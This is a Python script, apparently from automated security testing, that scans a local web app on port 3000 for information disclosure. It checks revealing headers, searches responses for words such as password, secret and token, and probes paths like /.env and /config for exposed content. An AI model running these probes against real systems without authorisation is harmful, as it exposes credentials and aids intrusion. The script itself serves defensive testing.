#!/usr/bin/env python3
import requests
import json
import sys
import re

def exploit():
    """
    Test for information disclosure vulnerability at root endpoint
    """
    
    # Initialize result structure
    result = {
        "vulnerability_id": "root-info-disclosure",
        "target_url": "http://localhost:3000",
        "vulnerable": False,
        "findings": [],
        "error": None
    }
    
    # Define various User-Agent headers to test different responses
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "curl/7.68.0",
        "python-requests/2.28.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        ""  # Empty user agent
    ]
    
    # Sensitive headers to check for
    sensitive_headers = [
        'server', 'x-powered-by', 'x-aspnet-version', 'x-generator',
        'x-version', 'x-runtime', 'x-framework', 'x-debug', 'x-error',
        'set-cookie', 'www-authenticate', 'authorization'
    ]
    
    # Keywords that might indicate information disclosure in response body
    sensitive_keywords = [
        'version', 'debug', 'error', 'stack trace', 'exception',
        'database', 'password', 'secret', 'token', 'api key',
        'internal', 'development', 'staging', 'localhost'
    ]
    
    try:
        for i, ua in enumerate(user_agents):
            # Prepare headers for request
            headers = {}
            if ua:
                headers['User-Agent'] = ua
            
            # Send GET request to root endpoint
            response = requests.get(
                "http://localhost:3000/",
                headers=headers,
                timeout=10,
                allow_redirects=True
            )
            
            finding = {
                "test_case": f"user_agent_{i}",
                "user_agent": ua if ua else "empty",
                "status_code": response.status_code,
                "disclosed_headers": {},
                "sensitive_content": [],
                "response_size": len(response.content)
            }
            
            # Check response headers for sensitive information
            for header_name, header_value in response.headers.items():
                if header_name.lower() in sensitive_headers:
                    finding["disclosed_headers"][header_name] = header_value
                    result["vulnerable"] = True
            
            # Check response body for sensitive information (first 2000 chars to avoid huge responses)
            response_text = response.text[:2000].lower()
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    # Extract context around the keyword
                    pattern = rf'.{{0,50}}{re.escape(keyword)}.{{0,50}}'
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    if matches:
                        finding["sensitive_content"].extend([
                            {"keyword": keyword, "context": match.strip()} 
                            for match in matches[:3]  # Limit to 3 matches per keyword
                        ])
                        result["vulnerable"] = True
            
            # Check for common server software disclosure patterns
            server_patterns = [
                r'apache/[\d.]+',
                r'nginx/[\d.]+',
                r'iis/[\d.]+',
                r'express/[\d.]+',
                r'node\.js/[\d.]+',
                r'php/[\d.]+',
                r'python/[\d.]+',
                r'ruby/[\d.]+',
                r'tomcat/[\d.]+'
            ]
            
            # Check Server header and response body for version patterns
            server_header = response.headers.get('Server', '').lower()
            full_text = (server_header + " " + response_text).lower()
            
            for pattern in server_patterns:
                matches = re.findall(pattern, full_text, re.IGNORECASE)
                if matches:
                    finding["sensitive_content"].extend([
                        {"keyword": "version_info", "context": match} 
                        for match in matches
                    ])
                    result["vulnerable"] = True
            
            # Check for error messages that might reveal paths or internal info
            error_patterns = [
                r'/[a-z]+/[a-z]+/[a-z0-9_-]+\.[a-z]+',  # File paths
                r'line \d+',  # Line numbers
                r'at .+\(.+:\d+:\d+\)',  # Stack trace format
                r'error: .+',  # Error messages
            ]
            
            for pattern in error_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                if matches:
                    finding["sensitive_content"].extend([
                        {"keyword": "error_disclosure", "context": match} 
                        for match in matches[:2]
                    ])
                    result["vulnerable"] = True
            
            # Only add finding if something interesting was discovered
            if finding["disclosed_headers"] or finding["sensitive_content"] or response.status_code >= 400:
                result["findings"].append(finding)
        
        # Additional check: Try to trigger error pages
        error_endpoints = ['/.env', '/config', '/debug', '/info', '/status']
        for endpoint in error_endpoints:
            try:
                error_response = requests.get(
                    f"http://localhost:3000{endpoint}",
                    timeout=5
                )
                
                if error_response.status_code == 200 and len(error_response.text) > 10:
                    result["findings"].append({
                        "test_case": "endpoint_enumeration",
                        "endpoint": endpoint,
                        "status_code": error_response.status_code,
                        "response_preview": error_response.text[:200]
                    })
                    result["vulnerable"] = True
                    
            except requests.exceptions.RequestException:
                continue
                
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection failed - target may be down"
    except requests.exceptions.Timeout:
        result["error"] = "Request timeout"
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
    
    return result

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))